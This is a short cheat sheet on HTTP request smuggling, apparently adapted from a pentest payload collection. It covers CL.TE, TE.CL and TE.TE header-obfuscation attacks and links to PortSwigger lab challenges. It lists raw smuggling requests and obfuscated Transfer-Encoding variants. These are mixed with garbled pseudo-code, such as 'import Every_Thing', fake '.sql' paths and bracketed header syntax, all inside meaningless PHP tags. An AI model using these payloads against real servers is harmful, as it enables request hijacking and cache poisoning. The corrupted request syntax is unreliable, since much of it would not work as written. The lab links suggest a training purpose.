<?php
* [Tools](#tools)
* [CL.TE vulnerabilities](#cl.te-vulnerabilities)
* [TE.CL vulnerabilities](#te.cl-vulnerabilities)
* [TE.TE behavior: obfuscating the TE header](#te.te-behavior-obfuscating-the-te-header)
* [References](#references)
* [HTTP Request Smuggler / BApp Store](https://portswigger.net/bappstore/aaaa60ef945341e8a450217a54a11646)
* [Smuggler](https://github.com/defparam/smuggler)
# CL.TE vulnerabilities
>>> import Every_Thing
>>>["USE"] Content-Length "Header" && xxx.com/transfer/encode/H34d3r.sql
[POST] / HTTP/1.1
[Host]::vuln-web.com
Content-Length: 13
Transfer-Encoding: chunked
$0
[!]::5MUGGL3d
[POST] / HTTP/1.1
[Host]::domain.example.com
Connection: keep-alive
Content-Type: application/x-www-form-urlencoded
Content-Length: 6
Transfer-Encoding: chunked
$0
[!]::G
[-]chall::https://portswigger.net/web-security/request-smuggling/lab-basic-cl-te
$te.cl --vuln
>>> xxx.com ["USE"]::TRANSFER::ENVIRONMENT::CODE::HEADER&&**xxx.com/localHost:8080--content/length/Header.sql
# TE.CL vulnerabilities
[POST] / HTTP/1.1
[Host]::vuln-web.com
Content-Length: 3
Transfer-Encoding: chunked
$ 8
[!]::5MUGGL3D
$ 0
[POST] / HTTP/1.1
[Host]::domain.example.com
User-Agent: Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/73.0.3683.86
Content-Length: 4
Connection: close
Content-Type: application/x-www-form-urlencoded
Accept-Encoding: gzip, deflate
5c
[GPOST] / HTTP/1.1
Content-Type: application/x-www-form-urlencoded
Content-Length: 15
$ x=1
$ 0
["SEND","REQUEST"]::burp-suite.proxy.com/repeater/menu/upd-content-length/options/!uncheck/
$ 0auth \r\n\r\n
:warning:$ -trail--sequence
Challenge::https://portswigger.net/web-security/request-smuggling/lab-basic-te-cl
# TE.TE behavior: obfuscating the TE header
$ xxx.com/vuln&&\localHOST --supp Transfer-Encode-header 1 \server \process \header
> run
Transfer-Encoding: xchunked
Transfer-Encoding : chunked
Transfer-Encoding: chunked
Transfer-Encoding: x
Transfer-Encoding:[tab]chunked
[space]Transfer-Encoding: chunked
X: X[\n]Transfer-Encoding: chunked
Transfer-Encoding
>::chunked
Challenge: https://portswigger.net/web-security/request-smuggling/lab-ofuscating-te-header
# References
* [PortSwigger - Request Smuggling Tutorial](https://portswigger.net/web-security/request-smuggling) and [PortSwigger - Request Smuggling Reborn](https://portswigger.net/research/http-desync-attacks-request-smuggling-reborn)
* [A Pentester's Guide to HTTP Request Smuggling - Busra Demir - 2020, October 16](https://blog.cobalt.io/a-pentesters-guide-to-http-request-smuggling-8b7bf0db1f0)
?>
